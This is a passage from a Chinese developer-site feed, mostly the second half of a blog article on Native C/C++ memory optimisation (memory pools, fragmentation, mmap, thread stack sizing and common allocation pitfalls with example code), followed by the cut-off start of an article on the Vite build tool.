    <span class="hljs-comment">// 初始化内存池：每个内存块1KB，共100个</span>
    init_memory_pool(&amp;pool, <span class="hljs-number">1024</span>, <span class="hljs-number">100</span>);

    <span class="hljs-comment">// 从池中获取内存</span>
    <span class="hljs-type">void</span>* buf1 = alloc_from_pool(&amp;pool);
    <span class="hljs-type">void</span>* buf2 = alloc_from_pool(&amp;pool);

    <span class="hljs-comment">// 使用内存...</span>

    <span class="hljs-comment">// 归还内存到池中</span>
    free_to_pool(&amp;pool, buf1);
    free_to_pool(&amp;pool, buf2);

    <span class="hljs-comment">// 销毁内存池</span>
    destroy_memory_pool(&amp;pool);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

</code></pre>
<p>内存池的核心优势：减少malloc/free的调用次数，避免内存碎片；内存分配/释放的效率更高（只需遍历链表、修改标记）；适合固定大小的内存分配场景。如果需要分配不同大小的内存，可以设计“多级内存池”（比如1KB、4KB、8KB等不同规格的内存块）。</p>
<h3 data-id="heading-36">3.3 内存碎片优化：避免“内存碎片化”导致的OOM</h3>
<p>内存碎片是Native内存的另一个“隐形杀手”——虽然总空闲内存足够，但这些空闲内存被分割成多个零散的小块，无法分配出一块连续的大内存，最终导致OOM。比如：系统总空闲内存100MB，但最大的连续空闲块只有1MB，此时要分配2MB内存就会失败。</p>
<p>内存碎片主要分为两种：</p>
<ul>
<li>
<p><strong>内部碎片</strong>：分配的内存块比实际需要的大，导致内存浪费（比如需要1KB，却分配了2KB）；</p>
</li>
<li>
<p><strong>外部碎片</strong>：频繁分配/释放不同大小的内存块，导致空闲内存被分割成零散的小块。</p>
</li>
</ul>
<h4 data-id="heading-37">优化方案：</h4>
<h5 data-id="heading-38">（1）减少内部碎片：按需分配内存</h5>
<p>避免分配超出需求的内存，比如需要存储100个字符的字符串，就分配101字节（预留1字节存结束符），而不是分配1KB。同时，对于固定大小的数据结构，尽量统一规格，减少内存浪费。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>

<span class="hljs-comment">// 不好的写法：分配1KB内存，只使用101字节，内部碎片严重</span>
<span class="hljs-type">char</span>* <span class="hljs-title function_">bad_alloc</span><span class="hljs-params">()</span> {
    <span class="hljs-type">char</span>* buf = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">1024</span>);
    <span class="hljs-built_in">strcpy</span>(buf, <span class="hljs-string">"hello world"</span>); <span class="hljs-comment">// 仅使用12字节（含结束符）</span>
    <span class="hljs-keyword">return</span> buf;
}

<span class="hljs-comment">// 好的写法：按需分配，减少内部碎片</span>
<span class="hljs-type">char</span>* <span class="hljs-title function_">good_alloc</span><span class="hljs-params">()</span> {
    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* str = <span class="hljs-string">"hello world"</span>;
    <span class="hljs-type">size_t</span> size = <span class="hljs-built_in">strlen</span>(str) + <span class="hljs-number">1</span>; <span class="hljs-comment">// 按需计算大小（12字节）</span>
    <span class="hljs-type">char</span>* buf = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);
    <span class="hljs-keyword">if</span> (buf != <span class="hljs-literal">NULL</span>) {
        <span class="hljs-built_in">strcpy</span>(buf, str);
    }
    <span class="hljs-keyword">return</span> buf;
}

</code></pre>
<h5 data-id="heading-39">（2）减少外部碎片：使用内存池+避免频繁分配/释放</h5>
<p>如前文所述，内存池能避免频繁分配/释放不同大小的内存块，减少外部碎片。此外，还可以采取以下技巧：</p>
<ul>
<li>
<p>优先使用大的连续内存块，避免频繁分配/释放小内存块；</p>
</li>
<li>
<p>对于长期使用的内存，一次性分配足够的大小，避免多次realloc（realloc可能会移动内存，导致碎片）；</p>
</li>
<li>
<p>尽量在程序启动时分配长期使用的内存，程序退出时统一释放，减少中间频繁的分配/释放操作。</p>
</li>
</ul>
<h5 data-id="heading-40">（3）使用mmap分配大内存（适合超过1MB的内存）</h5>
<p>对于超过1MB的大内存分配，推荐使用mmap替代malloc，因为mmap分配的内存来自系统的匿名共享内存，不会占用Native堆的空间，且释放时能完全回收，减少碎片。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span>

<span class="hljs-comment">// 使用mmap分配大内存</span>
<span class="hljs-type">void</span>* <span class="hljs-title function_">mmap_alloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span> {
    <span class="hljs-keyword">if</span> (size == <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
    }
    <span class="hljs-comment">// 打开匿名共享内存</span>
    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">"/dev/zero"</span>, O_RDWR);
    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
    }
    <span class="hljs-comment">// 分配内存：addr=NULL（系统自动分配），length=size，prot=读写，flags=共享，fd=匿名内存，offset=0</span>
    <span class="hljs-type">void</span>* ptr = mmap(<span class="hljs-literal">NULL</span>, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="hljs-number">0</span>);
    close(fd); <span class="hljs-comment">// 关闭文件描述符，不影响内存分配</span>
    <span class="hljs-keyword">if</span> (ptr == MAP_FAILED) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
    }
    <span class="hljs-keyword">return</span> ptr;
}

<span class="hljs-comment">// 释放mmap分配的内存</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">mmap_free</span><span class="hljs-params">(<span class="hljs-type">void</span>* ptr, <span class="hljs-type">size_t</span> size)</span> {
    <span class="hljs-keyword">if</span> (ptr != <span class="hljs-literal">NULL</span> &amp;&amp; ptr != MAP_FAILED) {
        munmap(ptr, size);
    }
}

<span class="hljs-comment">// 使用示例：分配10MB内存</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-type">size_t</span> size = <span class="hljs-number">10</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>; <span class="hljs-comment">// 10MB</span>
    <span class="hljs-type">void</span>* buf = mmap_alloc(size);
    <span class="hljs-keyword">if</span> (buf != <span class="hljs-literal">NULL</span>) {
        <span class="hljs-comment">// 使用内存...</span>
        mmap_free(buf, size);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

</code></pre>
<h3 data-id="heading-41">3.4 特殊场景优化：图片/文件/线程栈内存</h3>
<p>除了通用的内存优化技巧，针对Native开发中常见的特殊场景（比如图片处理、文件读写、线程创建），还有针对性的优化方案。</p>
<h4 data-id="heading-42">场景1：图片处理内存优化</h4>
<p>图片处理是Native内存占用的“重灾区”，比如加载一张1080P的图片（分辨率1920<em>1080），如果使用ARGB_8888格式，内存占用为：1920</em>1080*4 = 8294400字节（约8MB），如果加载多张图片，内存很容易暴涨。</p>
<p>优化技巧：</p>
<ul>
<li>
<p>按需缩放图片：根据展示尺寸缩放图片，避免加载原始尺寸的图片（比如展示尺寸为960*540，就缩放为原来的1/2，内存占用减少为原来的1/4）；</p>
</li>
<li>
<p>选择合适的像素格式：比如使用RGB_565格式（每个像素占2字节），比ARGB_8888（4字节）节省一半内存；</p>
</li>
<li>
<p>图片复用：使用内存池复用图片缓冲区，避免每次加载图片都分配新内存；</p>
</li>
<li>
<p>及时释放图片内存：图片展示完成后，立即释放缓冲区内存，避免长期持有。</p>
</li>
</ul>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 简化示例：图片缩放与内存复用</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>

<span class="hljs-comment">// 图片结构体</span>
<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Image</span> {</span>
    <span class="hljs-type">int</span> width;
    <span class="hljs-type">int</span> height;
    <span class="hljs-type">int</span> format; <span class="hljs-comment">// 像素格式：0=ARGB_8888，1=RGB_565</span>
    <span class="hljs-type">char</span>* data; <span class="hljs-comment">// 图片数据缓冲区</span>
} Image;

<span class="hljs-comment">// 缩放图片：将原始图片缩放到目标尺寸，复用目标图片的缓冲区</span>
<span class="hljs-type">bool</span> <span class="hljs-title function_">scale_image</span><span class="hljs-params">(<span class="hljs-type">const</span> Image* src, Image* dst)</span> {
    <span class="hljs-keyword">if</span> (src == <span class="hljs-literal">NULL</span> || dst == <span class="hljs-literal">NULL</span> || src-&gt;data == <span class="hljs-literal">NULL</span> || dst-&gt;data == <span class="hljs-literal">NULL</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    <span class="hljs-comment">// 计算原始图片和目标图片的像素大小</span>
    <span class="hljs-type">int</span> src_pixel_size = (src-&gt;format == <span class="hljs-number">0</span>) ? <span class="hljs-number">4</span> : <span class="hljs-number">2</span>;
    <span class="hljs-type">int</span> dst_pixel_size = (dst-&gt;format == <span class="hljs-number">0</span>) ? <span class="hljs-number">4</span> : <span class="hljs-number">2</span>;

    <span class="hljs-comment">// 计算需要的缓冲区大小，避免缓冲区溢出</span>
    <span class="hljs-type">size_t</span> dst_data_size = dst-&gt;width * dst-&gt;height * dst_pixel_size;
    <span class="hljs-comment">// 假设dst-&gt;data已通过内存池分配好，这里直接复用</span>

    <span class="hljs-comment">// 简化的缩放逻辑（实际需根据插值算法实现）</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y = <span class="hljs-number">0</span>; y &lt; dst-&gt;height; y++) {
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = <span class="hljs-number">0</span>; x &lt; dst-&gt;width; x++) {
            <span class="hljs-comment">// 计算原始图片的对应坐标</span>
            <span class="hljs-type">int</span> src_x = x * src-&gt;width / dst-&gt;width;
            <span class="hljs-type">int</span> src_y = y * src-&gt;height / dst-&gt;height;
            <span class="hljs-comment">// 拷贝像素数据（简化处理）</span>
            <span class="hljs-built_in">memcpy</span>(
                dst-&gt;data + (y * dst-&gt;width + x) * dst_pixel_size,
                src-&gt;data + (src_y * src-&gt;width + src_x) * src_pixel_size,
                dst_pixel_size
            );
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}

</code></pre>
<h4 data-id="heading-43">场景2：文件读写内存优化</h4>
<p>频繁的文件读写如果不优化，会频繁分配内存缓冲区，导致内存碎片。优化技巧：</p>
<ul>
<li>
<p>复用缓冲区：创建一个固定大小的缓冲区，重复用于文件读写，避免每次读写都分配新缓冲区；</p>
</li>
<li>
<p>合理设置缓冲区大小：缓冲区太小会导致频繁读写，太大则浪费内存，一般设置为4KB或8KB（与系统页大小一致）；</p>
</li>
<li>
<p>使用mmap映射文件：对于大文件（比如超过10MB），使用mmap将文件映射到内存，避免读取文件时分配大量内存缓冲区。</p>
</li>
</ul>
<h4 data-id="heading-44">场景3：线程栈内存优化</h4>
<p>每个Native线程都会分配一定大小的栈内存（默认一般为1MB），如果创建大量线程，线程栈内存会占用大量空间（比如创建100个线程，默认占用100MB栈内存）。</p>
<p>优化技巧：</p>
<ul>
<li>
<p>减少线程数量：使用线程池复用线程，避免频繁创建新线程；</p>
</li>
<li>
<p>调整线程栈大小：对于不需要大量栈内存的线程（比如简单的计算线程），创建时指定较小的栈大小（比如512KB），减少内存占用。</p>
</li>
</ul>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-comment">// 线程执行函数</span>
<span class="hljs-type">void</span>* <span class="hljs-title function_">thread_func</span><span class="hljs-params">(<span class="hljs-type">void</span>* arg)</span> {
    <span class="hljs-comment">// 线程业务逻辑...</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
}

<span class="hljs-comment">// 创建线程并设置栈大小</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">create_thread_with_stack_size</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span>* thread, <span class="hljs-type">size_t</span> stack_size)</span> {
    <span class="hljs-type">pthread_attr_t</span> attr;
    <span class="hljs-type">int</span> ret = pthread_attr_init(&amp;attr);
    <span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> ret;
    }
    <span class="hljs-comment">// 设置线程栈大小</span>
    ret = pthread_attr_setstacksize(&amp;attr, stack_size);
    <span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span>) {
        pthread_attr_destroy(&amp;attr);
        <span class="hljs-keyword">return</span> ret;
    }
    <span class="hljs-comment">// 创建线程</span>
    ret = pthread_create(thread, &amp;attr, thread_func, <span class="hljs-literal">NULL</span>);
    pthread_attr_destroy(&amp;attr);
    <span class="hljs-keyword">return</span> ret;
}

<span class="hljs-comment">// 使用示例：创建栈大小为512KB的线程</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-type">pthread_t</span> thread;
    <span class="hljs-type">size_t</span> stack_size = <span class="hljs-number">512</span> * <span class="hljs-number">1024</span>; <span class="hljs-comment">// 512KB</span>
    <span class="hljs-type">int</span> ret = create_thread_with_stack_size(&amp;thread, stack_size);
    <span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>) {
        pthread_join(thread, <span class="hljs-literal">NULL</span>);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

</code></pre>
<h2 data-id="heading-45">四、避坑指南：这些Native内存“坑”千万别踩</h2>
<p>Native内存优化的路上，有很多“隐形坑”，一不小心就会导致内存泄漏、崩溃，下面整理了最常见的6个坑，帮你避坑避雷。</p>
<h3 data-id="heading-46">坑1：重复释放内存</h3>
<p>同一指针被free/delete多次，会导致程序崩溃，尤其是在多线程场景中，容易出现“多个线程释放同一内存”的问题。</p>
<p>避坑方案：释放内存后，将指针置空；多线程场景中，使用互斥锁保护内存释放操作，避免重复释放。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mutex&gt;</span></span>

<span class="hljs-built_in">std</span>::mutex m_mutex;
<span class="hljs-type">char</span>* buf = <span class="hljs-literal">NULL</span>;

<span class="hljs-type">void</span> <span class="hljs-title function_">safe_free</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">std</span>::lock_guard&lt;<span class="hljs-built_in">std</span>::mutex&gt; <span class="hljs-title function_">lock</span><span class="hljs-params">(m_mutex)</span>;
    <span class="hljs-keyword">if</span> (buf != <span class="hljs-literal">NULL</span>) {
        <span class="hljs-built_in">free</span>(buf);
        buf = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 置空指针，避免重复释放</span>
    }
}

</code></pre>
<h3 data-id="heading-47">坑2：野指针访问</h3>
<p>内存被释放后，指针未置空，后续又使用该指针，会导致未知错误（崩溃、数据错乱），且排查难度极大。</p>
<p>避坑方案：释放内存后，立即将指针置空；使用指针前，先判断指针是否为空。</p>
<h3 data-id="heading-48">坑3：C++数组用delete释放（未加[]）</h3>
<p>用new[]分配的数组，用delete释放，会导致数组中除首元素外的内存无法释放，形成隐蔽性内存泄漏。</p>
<p>避坑方案：严格遵循“new[]配delete[]，new配delete”的原则，不要混淆使用。</p>
<h3 data-id="heading-49">坑4：智能指针循环引用</h3>
<p>C++的shared_ptr如果出现循环引用（A持有B的shared_ptr，B持有A的shared_ptr），会导致两个对象都无法释放，形成内存泄漏。</p>
<p>避坑方案：将其中一方的shared_ptr改为weak_ptr（弱引用），weak_ptr不增加引用计数，避免循环引用。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;memory&gt;</span></span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>; <span class="hljs-comment">// 前置声明</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> {
<span class="hljs-keyword">public</span>:
    std::weak_ptr&lt;B&gt; b_ptr; <span class="hljs-comment">// 用weak_ptr替代shared_ptr</span>
    ~<span class="hljs-built_in">A</span>() { <span class="hljs-built_in">printf</span>(<span class="hljs-string">"A destroyed\n"</span>); }
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> {
<span class="hljs-keyword">public</span>:
    std::shared_ptr&lt;A&gt; a_ptr;
    ~<span class="hljs-built_in">B</span>() { <span class="hljs-built_in">printf</span>(<span class="hljs-string">"B destroyed\n"</span>); }
};

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">auto</span> a = std::<span class="hljs-built_in">make_shared</span>&lt;A&gt;();
    <span class="hljs-keyword">auto</span> b = std::<span class="hljs-built_in">make_shared</span>&lt;B&gt;();
    a-&gt;b_ptr = b;
    b-&gt;a_ptr = a;
    <span class="hljs-comment">// 退出时，a和b会被正常销毁，避免循环引用泄漏</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

</code></pre>
<h3 data-id="heading-50">坑5：忽略内存分配失败的情况</h3>
<p>调用malloc、new等函数时，默认认为内存分配成功，但实际中可能因内存不足导致分配失败（返回NULL或抛出异常），如果不处理，会导致程序崩溃。</p>
<p>避坑方案：针对不同分配方式，做针对性的失败处理，避免直接使用未分配成功的指针。</p>
<h4 data-id="heading-51">C语言（malloc/calloc/realloc）：强制判断返回值</h4>
<p>malloc、calloc、realloc分配失败时会返回NULL，必须在分配后立即判断，避免使用NULL指针操作内存。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">void</span> <span class="hljs-title function_">safe_malloc</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 分配1MB内存</span>
    <span class="hljs-type">char</span>* buf = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);
    <span class="hljs-comment">// 关键：判断分配是否成功</span>
    <span class="hljs-keyword">if</span> (buf == <span class="hljs-literal">NULL</span>) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"内存分配失败\n"</span>);
        <span class="hljs-comment">// 容错处理：返回、退出或使用备用方案</span>
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-comment">// 业务逻辑...</span>
    <span class="hljs-built_in">free</span>(buf);
    buf = <span class="hljs-literal">NULL</span>;
}

</code></pre>
<h4 data-id="heading-52">C++（new）：捕获异常或使用nothrow版本</h4>
<p>C++的new默认会抛出std::bad_alloc异常，若未捕获会导致程序崩溃；也可使用new(nothrow)版本，分配失败返回NULL，类似C语言的malloc。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;new&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">safe_new</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// 方案1：捕获异常（推荐，符合C++异常机制）</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">int</span>* p = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>]; <span class="hljs-comment">// 分配4MB内存</span>
        <span class="hljs-comment">// 业务逻辑...</span>
        <span class="hljs-keyword">delete</span>[] p;
    } <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> std::bad_alloc&amp; e) {
        <span class="hljs-comment">// 捕获内存分配失败异常，做容错处理</span>
        std::cerr &lt;&lt; <span class="hljs-string">"内存分配失败："</span> &lt;&lt; e.<span class="hljs-built_in">what</span>() &lt;&lt; std::endl;
    }

    <span class="hljs-comment">// 方案2：使用nothrow版本，返回NULL</span>
    <span class="hljs-type">int</span>* q = <span class="hljs-built_in">new</span> (std::nothrow) <span class="hljs-type">int</span>[<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>];
    <span class="hljs-keyword">if</span> (q == <span class="hljs-literal">NULL</span>) {
        std::cerr &lt;&lt; <span class="hljs-string">"内存分配失败"</span> &lt;&lt; std::endl;
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-comment">// 业务逻辑...</span>
    <span class="hljs-keyword">delete</span>[] q;
}

</code></pre>
<p>注意：内存分配失败后，不要强行使用指针，应做容错处理（比如降低内存占用、释放其他无用内存后重试、提示用户等）。</p>
<h3 data-id="heading-53">坑6：mmap分配后未检查MAP_FAILED</h3>
<p>前文提到mmap适合分配大内存，但很多开发者会忽略mmap的返回值检查——mmap分配失败时返回MAP_FAILED（本质是(void*)-1），而非NULL，若误判为NULL会导致后续操作出错。</p>
<p>避坑方案：分配后严格检查返回值是否为MAP_FAILED，同时处理文件描述符打开失败的情况。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">void</span> <span class="hljs-title function_">safe_mmap</span><span class="hljs-params">()</span> {
    <span class="hljs-type">size_t</span> size = <span class="hljs-number">10</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>; <span class="hljs-comment">// 10MB</span>
    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">"/dev/zero"</span>, O_RDWR);
    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"打开匿名内存失败"</span>);
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-comment">// 分配内存</span>
    <span class="hljs-type">void</span>* ptr = mmap(<span class="hljs-literal">NULL</span>, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="hljs-number">0</span>);
    close(fd);
    <span class="hljs-comment">// 关键：检查是否分配成功（区分NULL和MAP_FAILED）</span>
    <span class="hljs-keyword">if</span> (ptr == MAP_FAILED) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"mmap内存分配失败"</span>);
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-comment">// 业务逻辑...</span>
    munmap(ptr, size);
}

</code></pre>
<p>易错点：不要用“if (ptr == NULL)”判断mmap是否成功，因为MAP_FAILED是(void*)-1，和NULL（0）是两个不同的值，误判会导致分配失败后仍继续使用无效指针。</p>
<h2 data-id="heading-54">五、总结：Native内存优化的核心逻辑</h2>
<p>Native内存优化不是“一次性操作”，而是贯穿开发、测试、上线全流程的习惯——底层要懂“分配-释放”的规则，排查要会用工具定位问题，编码要避开常见坑，核心围绕三点：</p>
<ul>
<li>
<p><strong>可控</strong>：每一次内存分配，都要有对应的释放逻辑，杜绝“分配后不管”；</p>
</li>
<li>
<p><strong>高效</strong>：通过内存池、对象池复用内存，减少频繁分配/释放，降低碎片；</p>
</li>
<li>
<p><strong>容错</strong>：处理内存分配失败的情况，避免无效指针操作导致的崩溃。</p>
</li>
</ul>
<p>相比Java内存优化，Native内存更考验开发者的底层功底，但只要掌握本文的工具用法和编码技巧，就能把“野孩子”驯服成“贴心管家”，让APP摆脱卡顿、闪退，实现更流畅的运行体验。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[浅析Vite前端构建工具]]></title>    <link>https://juejin.cn/post/7602243150157774875</link>    <guid>https://juejin.cn/post/7602243150157774875</guid>    <pubDate>2026-02-03T04:22:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602243150157774875" data-draft-id="7602154088477081638" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="浅析Vite前端构建工具"/> <meta itemprop="keywords" content="Vite"/> <meta itemprop="datePublished" content="2026-02-03T04:22:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="saberxyL"/> <meta itemprop="url" content="https://juejin.cn/user/3942228504379243"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            浅析Vite前端构建工具
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3942228504379243/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    saberxyL
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:22:29.000Z" title="Tue Feb 03 2026 04:22:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读23分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body 